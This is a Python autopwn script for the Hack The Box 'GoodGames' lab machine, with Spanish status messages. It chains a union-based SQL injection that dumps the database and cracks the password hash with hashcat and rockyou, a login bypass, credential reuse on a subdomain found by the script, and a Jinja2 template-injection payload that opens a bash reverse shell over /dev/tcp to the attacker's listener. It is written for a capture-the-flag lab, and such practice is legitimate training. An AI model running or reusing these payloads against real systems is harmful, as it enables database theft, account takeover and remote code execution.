import sys,time,requests,signal,argparse,re,os,threading
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    hosts_reset()
    sys.exit(1)

def hosts_reset():
    os.system("cp /tmp/hosts /etc/hosts && rm /tmp/hosts")

def obtain_db(body,ip,port):

    response=requests.post(f"http://{ip}:{port}/login",data=body)
    
    match=re.search(r'>Welcome.*?<',response.text)

    db_info=match[0].split(" ")[1][0:-1]
    
    return db_info

def password_crack(password):

    p2=log.progress("Password cracking")
    p2.status("Starting process...")
    time.sleep(2)
    result=os.popen(f"hashcat -a 0 -m 0 --show '{password}' /usr/share/wordlists/rockyou.txt &>/dev/null").read()
    p2.success(f"La contraseña crackeada es: {result.split(':')[1]}")
    return result.split(":")[1]

def sqli_dump(ip,port):

    # DB name in usage extraction
    p1=log.progress("Exploitation of SQL injection in login panel")
    p1.status("Starting Exploitation...")
    time.sleep(2)
    body={"email":"' union select 1,2,3,database()-- -","password":"12345"}
    db_name=obtain_db(body,ip,port)
    p1.status(f"La base de datos en uso es: {db_name}")
    time.sleep(3)

    # DB tables names extraction
    body={"email":f"' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='{db_name}'-- -","password":"12345"}
    tables_names=obtain_db(body,ip,port)
    p1.status(f"Las tablas que se encuentran en la base de datos son: {tables_names}")
    
    # DB columns names extraction
    table_choice=input("\n[?] Introduce la tabla a dumpear: ")
    body={"email":f"' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema='{db_name}' and table_name='{table_choice}'-- -","password":"12345"}
    columns_names=obtain_db(body,ip,port)
    p1.status(f"Las columnas que se encuentran en la tabla blog son: {columns_names}")

    #DB information extraction
    columns_choice=list(input("[?] Introduce las columnas a dumpear: ").split(" "))
    email="' union select 1,2,3,group_concat("
    count=1
    for choice in columns_choice:
        if count==len(columns_choice):
            email+=choice
        else:
            email+=choice+","+'";"'+","
            count+=1
    email+=f") from {table_choice}-- -"
    body={"email":email,"password":"12345"}
    db_info=obtain_db(body,ip,port)
    p1.success(f"La información dumpeada de la base de datos seleccionada es: {db_info}")

    password=password_crack(db_info.split(";")[1])

    return password[:-1],db_info.split("@")[0]

def sqli_bypass(ip,port):

    p3=log.progress("Bypassing login panel")
    p3.status("Starting bypass")
    time.sleep(2)
    
    session=requests.Session()

    body={"email":"' or 1=1-- -","password":"12345"}

    response=session.post(f"http://{ip}:{port}/login",data=body)
    
    if re.search(r'Welcome',response.text):
        p3.success("Se ha bypasseado el login")
    
    return session

def subdomain_login(subdomain,port,password,user):

    p5=log.progress("Log in new website")
    p5.status("Testing credential resuse")
    time.sleep(2)

    session=requests.Session()

    response=session.get(f"http://{subdomain}:{port}")

    csrf_token=re.search(r'csrf[^\s]* [a-z-="_]{1,30} [a-z-="_]{1,30} value="(.*?)"',response.text)[1]

    body={"csrf_token":f"{csrf_token}","username":f"{user}","password":f"{password}","login":""}

    response=session.post(f"http://{subdomain}:{port}/login",data=body)

    if re.search(r'Sign Out',response.text):
        p5.success("Login Successfull as user admin")

    return session

def ssti_to_rce(session,subdomain,port,dest_ip,dest_port):

    time.sleep(2)

    body={"name":f"{{{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/{dest_ip}/{dest_port} 0>&1\"').read() }}}}"}

    response=session.post(f"http://{subdomain}:{port}/settings",data=body)

signal.signal(signal.SIGINT,def_handler)

if __name__ =="__main__":

    parser=argparse.ArgumentParser(usage='autopown.py [arguments]', description="script designed to autopwn GoodGames HTB machine.")
    parser.add_argument('ip', help="Vulnerable machine IP")
    parser.add_argument('-p','--port', default=80, help="Vulnerable machine port", metavar="<port>")
    parser.add_argument('destip', help="Your machine IP")
    parser.add_argument('destport', help="Port used to receive the reverse shell")
    args=parser.parse_args()

    password,user=sqli_dump(args.ip,args.port)

    session=sqli_bypass(args.ip,args.port)

    p4=log.progress("Web Analysis")
    p4.status("Analyzing website where you are logged in to")
    time.sleep(2)

    response=session.get(f"http://{args.ip}:{args.port}")

    subdomain=re.search(r'([a-z-]{1,30}\.[a-z]{1,9}\.htb)',response.text)[1]

    p4.success(f"Se ha encontrado un subdomnio nuevo a investigar: {subdomain}")

    os.system("cp /etc/hosts /tmp/hosts")

    with open("/etc/hosts", "a") as file:
        file.write(f"{args.ip} {subdomain}")
    file.close()

    session=subdomain_login(subdomain,args.port,password,user)

    p6=log.progress("SSTI exploitation to RCE")
    p6.status("Starting exploitation and obtaing reverse shell")

    try:
        threading.Thread(target=ssti_to_rce, args=(session,subdomain,args.port,args.destip,args.destport,)).start()
    except Exception as e:
        print(f"\n[!] Se ha producido un error: {e}")
    
    shell=listen(9999,timeout=20).wait_for_connection()

    p6.success("Successful exploitation")

    shell.interactive()
